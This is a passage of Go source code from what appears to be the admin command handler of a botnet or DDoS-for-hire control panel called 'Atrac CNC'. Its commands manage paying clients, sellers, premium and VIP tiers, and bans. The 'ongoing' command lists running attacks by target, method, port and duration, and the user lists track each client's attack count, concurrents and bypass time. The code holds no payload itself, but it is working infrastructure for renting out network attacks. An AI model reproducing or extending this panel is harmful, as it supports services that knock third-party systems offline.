fmt.Fprintln(this.conn, "\033[0;97mAdmin \033[0;92mAdded\033[0;97m. \033[0;96m" + user.username + "\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "premium=false":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: premium=false (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.RemovePremium(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " | Revoked Premium Access To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mPremium Access \033[0;31mRevoked\033[0;97m. \033[0;96m"+user.username+"\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "premium=true":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: premium=true (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.MakePremium(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " -> Added Premium Access To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mPremium Access \033[0;92mAdded\033[0;97m. \033[0;96m" + user.username + "\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "home=false":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: home=false (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.RemoveHome(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " | Revoked Home Access To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mHome Access \033[0;31mRevoked\033[0;97m. \033[0;96m"+user.username+"\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "home=true":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: home=true (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.MakeHome(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " -> Added Home Access To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mHome Access \033[0;92mAdded\033[0;97m. \033[0;96m" + user.username + "\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "seller=false":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: seller=false (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.RemoveSeller(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " | Revoked Seller Access To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSeller Access \033[0;31mRevoked\033[0;97m. \033[0;96m"+user.username+"\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "seller=true":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: seller=true (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.MakeSeller(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " -> Added Seller Access To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSeller Access \033[0;92mAdded\033[0;97m. \033[0;96m" + user.username + "\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "broadcast":
	if userInfo.seller == true {
		// ...
	}
	
	if userInfo.admin == false {
		this.conn.Write([]byte("\033[0m\r\n"))
		fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
		continue
	}
	
	words := strings.Split(strings.Join(args, " "), " ")
	if len(words) < 3 {
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0mSyntax Must Contain: broadcast <message>\033[0m\r\n"))
		this.conn.Write([]byte("\033[0mSyntax Example : broadcast Atrac CNC \033[0m\r\n"))
		continue
	}
	
	message := strings.Join(words[1:], " ")
	Broadcast([]byte("\033[0m\r\n"))
	Broadcast([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[38;5;16m\x1b[48;5;11m (BROADCAST): "+message+"\x1b[0m\x1b8\r\n"))
	Broadcast([]byte("\033[0m\r\n"))
	continue



//───────────────────────────────────────────────────────────────────────────────────────────────

case "cup":

if userInfo.seller == true {
goto skidadminauthcup
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skidadminauthcup:
if len(args) != 4 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[38;5;129mSy\033[38;5;128mnt\033[38;5;127ma\033[38;5;127mx: \033[0;96mcup \033[38;5;127m(\033[0;96musername\033[38;5;127m) (\033[0;96mpassword\033[38;5;127m) (\033[0;96mconfirm password\033[38;5;127m)\033[0m\r\n"))
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

enterpass := args[2]
confirmpass := args[3]

if confirmpass != enterpass {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mPassword's Do Not Match.\033[0m\r")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mConfirm (\033[0;92mYES\033[0;97m/\033[0;31mNO\033[0;97m)\033[0;96m: "))
confirm, err := this.ReadLine(false, true)
if err != nil {
}

if confirm != "YES" && confirm != "yes" {
this.conn.Write([]byte("\r\n"))
continue
}

if database.ChangeUsersPassword(user.username, enterpass) == false {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;31m%s\033[0m\r\n", "\033[0;31mFailed.\033[0m")))
} else {
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mPassword Changed.\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97m─────────────────────────────────────────\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mUsername\033[0;36m: %s\033[0m\r\n", user.username)))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mPassword\033[0;31m: %s\033[0m\r\n", enterpass)))
this.conn.Write([]byte("\033[0m\r\n"))
continue
}
continue


//───────────────────────────────────────────────────────────────────────────────────────────────

case "removeclient":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: removeclient (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

_, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if !database.RemoveUser(args[1]) {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;31mUnable To Remove.\033[0m\r\n")))
} else {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mRemoved User.\033[0m\r\n"))
}
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "clientadd":

if userInfo.seller == true {
goto skipadminauth2add
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2add:
if len(args) < 3 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: add (\033[0;96musername\033[0;97m) (\033[0;96mdays\033[0;97m)\033[0m\r")
continue
}

new_un := args[1]
planExpireDaysStr := args[2]
expiry, err := strconv.Atoi(planExpireDaysStr)
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;31mInvalid ExpDate.\033[0m\r\n")))
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mConfirm (\033[0;92mYES\033[0;97m/\033[0;31mNO\033[0;97m)\033[0;96m: "))
confirm, err := this.ReadLine(false, true)
if err != nil {
}

if confirm != "YES" && confirm != "yes" {
continue
}

if !database.CreateUser(new_un, expiry) {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;31m%s\033[0m\r\n", "\033[0;31mFailed.\033[0m")))
} else {
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mAccount Added.\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97m─────────────────────────────────────────\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mUsername\033[0;36m: %s\033[0m\r\n", new_un)))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mPassword\033[0;31m: changeme\033[0m\r\n")))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mExpDays\033[0;36m: %s\033[0m\r\n", planExpireDaysStr)))
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " -> Added Account: " + new_un + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
f.Close()
}

err = f.Close()
if err != nil {
continue
}

continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "kickuser":

if userInfo.seller == true {
goto skipadminauth2kick
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2kick:
if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: kickuser (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

i := 1
sessionMutex.Lock()
for _, s := range sessions {
if s.Username == args[1] {
go func(ss *Session) {
ss.Conn.Close()
return
buf := make([]byte, 20)
s.Conn.Read(buf)
}(s)

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintf(this.conn, "\033[0;97mKicked User On Session \033[0;96m#%d\033[0;97m.\033[0m\r\n", i)
i++
}
}

sessionMutex.Unlock()
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "ongoing":

if userInfo.admin == true {
table := simpletable.New()
table.Header = &simpletable.Header{
Cells: []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: "#"},
{Align: simpletable.AlignCenter, Text: "Target"},
{Align: simpletable.AlignCenter, Text: "Method"},
{Align: simpletable.AlignCenter, Text: "Port"},
{Align: simpletable.AlignCenter, Text: "Length"},
{Align: simpletable.AlignCenter, Text: "Finish"},
{Align: simpletable.AlignCenter, Text: "User"},
},
}

Attacks, _ := database.Ongoing(username)

count := 0
for _, s := range Attacks {
lol, _ := strconv.ParseInt(strconv.Itoa(int(s.end)), 10, 64)
TimeToWait := time.Unix(lol, 0)
count++
r := []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: strconv.Itoa(count)},
{Align: simpletable.AlignCenter, Text: s.target},
{Align: simpletable.AlignCenter, Text: s.method},
{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.port)},
{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.duration)},
{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%.0f Secs", time.Until(TimeToWait).Seconds())},
{Align: simpletable.AlignCenter, Text: s.username},
}

table.Body.Cells = append(table.Body.Cells, r)
}

if len(table.Body.Cells) == 0 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mThere Are No Running Attacks Currently.\033[0m\r\n"))
continue
}

if len(table.Body.Cells) > 0 {
table.SetStyle(simpletable.StyleCompact)

if count%19 == 0 && count != 0 {
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.03.1.7427 \033[0m\033[1A")

table.Body.Cells = make([][]*simpletable.Cell, 0)

this.conn.Read(make([]byte, 10))
fmt.Fprint(this.conn, "\033c")
}
}

if len(table.Body.Cells) > 0 {
fmt.Fprintf(this.conn, "\033c")
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprint(this.conn, "")
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\r")

}
} else {
table := simpletable.New()
table.Header = &simpletable.Header{
Cells: []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: "#"},
{Align: simpletable.AlignCenter, Text: "Target"},
{Align: simpletable.AlignCenter, Text: "Port"},
{Align: simpletable.AlignCenter, Text: "Length"},
{Align: simpletable.AlignCenter, Text: "Finish"},
},
}

Attacks, _ := database.Ongoing(username)

count := 0
for _, s := range Attacks {
lol, _ := strconv.ParseInt(strconv.Itoa(int(s.end)), 10, 64)
TimeToWait := time.Unix(lol, 0)
count++
r := []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: strconv.Itoa(count)},
{Align: simpletable.AlignCenter, Text: s.target},
{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.port)},
{Align: simpletable.AlignCenter, Text: strconv.Itoa(s.duration)},
{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%.0f Secs", time.Until(TimeToWait).Seconds())},
}

table.Body.Cells = append(table.Body.Cells, r)
}

if len(table.Body.Cells) == 0 {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mThere Are No Running Attacks Currently.\033[0m\r\n"))
continue
}

if len(table.Body.Cells) > 0 {
table.SetStyle(simpletable.StyleCompact)

if count%19 == 0 && count != 0 {
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.03.1.7427 \033[0m\033[1A")

table.Body.Cells = make([][]*simpletable.Cell, 0)

this.conn.Read(make([]byte, 10))
fmt.Fprint(this.conn, "\033c")
}
}

if len(table.Body.Cells) > 0 {
fmt.Fprintf(this.conn, "\033c")
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprint(this.conn, "")
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\r")
}
}
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "clientlist":

if userInfo.seller == true {
goto skipadminauth2listc
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2listc:
table := simpletable.New()
table.Header = &simpletable.Header{
Cells: []*simpletable.Cell{
{Align: simpletable.AlignLeft, Text: "\033[0m#\033[0m"},
{Align: simpletable.AlignLeft, Text: "\033[97mName\033[0m"},
{Align: simpletable.AlignLeft, Text: "\033[97mAdmin\033[0m"},
{Align: simpletable.AlignLeft, Text: "\033[97mSeller\033[0m"},
{Align: simpletable.AlignLeft, Text: "\033[97mAttacks\033[0m"},
{Align: simpletable.AlignLeft, Text: "\033[97mHome-Time\033[0m"},
{Align: simpletable.AlignLeft, Text: "\033[97mBP-Time\033[0m"},
{Align: simpletable.AlignLeft, Text: "\033[97mExpDays\033[0m"},
},
}
users, err := database.GetUsers()
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mError.\r\n")
continue
}
var list []User
list = users
fmt.Fprint(this.conn, "\033c")
for i, user := range list {
r := []*simpletable.Cell{
{Align: simpletable.AlignLeft, Text: fmt.Sprint(user.ID)},
{Align: simpletable.AlignLeft, Text: user.username},
{Align: simpletable.AlignLeft, Text: formatBool(user.admin)},
{Align: simpletable.AlignLeft, Text: formatBool(user.seller)},
{Align: simpletable.AlignLeft, Text: strconv.Itoa(database.MySent(user.username))},
{Align: simpletable.AlignLeft, Text: strconv.Itoa(user.hometime)},
{Align: simpletable.AlignLeft, Text: strconv.Itoa(user.bypasstime)},
{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0;4;93m%.2f\033[0m", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
}
table.Body.Cells = append(table.Body.Cells, r)
if i%18 == 0 && i != 0 {
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.03.1.7427 \033[0m\033[1A")
table.Body.Cells = make([][]*simpletable.Cell, 0)
this.conn.Read(make([]byte, 10))
fmt.Fprint(this.conn, "\033c")
}
}
if len(table.Body.Cells) > 0 {
fmt.Fprintf(this.conn, "\033c")
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprint(this.conn, "")
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\r")
}
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "bannedlist":

if userInfo.seller == true {
goto skipadminauth2b
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2b:
table := simpletable.New()
var i = 0
table.Header = &simpletable.Header{
Cells: []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: "#"},
{Align: simpletable.AlignCenter, Text: "Username"},
{Align: simpletable.AlignCenter, Text: "Admin"},
{Align: simpletable.AlignCenter, Text: "VIP"},
{Align: simpletable.AlignCenter, Text: "ExpDays"},
{Align: simpletable.AlignCenter, Text: "Banned For"},
},
}

users, err := database.GetUsers()
if err != nil {
fmt.Println(err)
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "error\r")
continue
}

var bannedUsers []User
for _, user := range users {
if user.ban > time.Now().Unix() {
bannedUsers = append(bannedUsers, user)
}
}

for _, user := range bannedUsers {

r := []*simpletable.Cell{
{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
{Text: user.username},
{Text: formatBool(user.admin)},
{Text: formatBool(user.vip)},
{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.ban, 0))).Hours()/24)},
}

table.Body.Cells = append(table.Body.Cells, r)
if i%19 == 0 && i != 0 {
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.03.1.7427 \033[0m\033[1A")

table.Body.Cells = make([][]*simpletable.Cell, 0)

this.conn.Read(make([]byte, 10))
fmt.Fprint(this.conn, "\033c")
}
}

if len(table.Body.Cells) > 0 {
fmt.Fprintf(this.conn, "\033c")
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprint(this.conn, "")
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\r")

}
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "viplist":

if userInfo.seller == true {
goto skipadminauth2v
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2v:
table := simpletable.New()
var i = 0
table.Header = &simpletable.Header{
Cells: []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: "#"},
{Align: simpletable.AlignCenter, Text: "User"},
{Align: simpletable.AlignCenter, Text: "VIP"},
{Align: simpletable.AlignCenter, Text: "Conns"},
{Align: simpletable.AlignCenter, Text: "Cooldown"},
{Align: simpletable.AlignCenter, Text: "HomeTime"},
{Align: simpletable.AlignCenter, Text: "ExpDate"},
},
}

users, err := database.GetUsers()
if err != nil {
fmt.Println(err)
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "error\r")
continue
}

var vipusers []User
for _, user := range users {
if user.vip == true {
vipusers = append(vipusers, user)
}
}

for _, user := range vipusers {

r := []*simpletable.Cell{
{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
{Text: user.username},
{Text: formatBool(user.vip)},
{Text: fmt.Sprintf("%d", user.concurrents)},
{Text: fmt.Sprintf("%d", user.cooldown)},
{Text: fmt.Sprintf("%d", user.hometime)},
{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
}

table.Body.Cells = append(table.Body.Cells, r)
if i%19 == 0 && i != 0 {
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.03.1.7427 \033[0m\033[1A")

table.Body.Cells = make([][]*simpletable.Cell, 0)

this.conn.Read(make([]byte, 10))
fmt.Fprint(this.conn, "\033c")
}
}

if len(table.Body.Cells) > 0 {
fmt.Fprintf(this.conn, "\033c")
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprint(this.conn, "")
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\r")

}
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "premiumlist":

if userInfo.seller == true {
goto skipadminauth2p
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2p:
table := simpletable.New()
var i = 0
table.Header = &simpletable.Header{
Cells: []*simpletable.Cell{
{Align: simpletable.AlignCenter, Text: "#"},
{Align: simpletable.AlignCenter, Text: "User"},
{Align: simpletable.AlignCenter, Text: "Premium"},
{Align: simpletable.AlignCenter, Text: "Conns"},
{Align: simpletable.AlignCenter, Text: "Cooldown"},
{Align: simpletable.AlignCenter, Text: "HomeTime"},
{Align: simpletable.AlignCenter, Text: "ExpDate"},
},
}

users, err := database.GetUsers()
if err != nil {
fmt.Println(err)
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "error\r")
continue
}

var premiumuserslol []User
for _, user := range users {
if user.premium == true {
premiumuserslol = append(premiumuserslol, user)
}
}

for _, user := range premiumuserslol {

r := []*simpletable.Cell{
{Align: simpletable.AlignRight, Text: fmt.Sprint(user.ID)},
{Text: user.username},
{Text: formatBool(user.premium)},
{Text: fmt.Sprintf("%d", user.concurrents)},
{Text: fmt.Sprintf("%d", user.cooldown)},
{Text: fmt.Sprintf("%d", user.hometime)},
{Text: fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
}

table.Body.Cells = append(table.Body.Cells, r)
if i%19 == 0 && i != 0 {
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.03.1.7427 \033[0m\033[1A")

table.Body.Cells = make([][]*simpletable.Cell, 0)

this.conn.Read(make([]byte, 10))
fmt.Fprint(this.conn, "\033c")
}
}

if len(table.Body.Cells) > 0 {
fmt.Fprintf(this.conn, "\033c")
table.SetStyle(simpletable.StyleUnicode)
fmt.Fprint(this.conn, "")
fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
fmt.Fprintln(this.conn, "\r")

}
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "sellerlist":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

table := simpletable.New()
var i = 0
table.Header = &simpletable.Header{
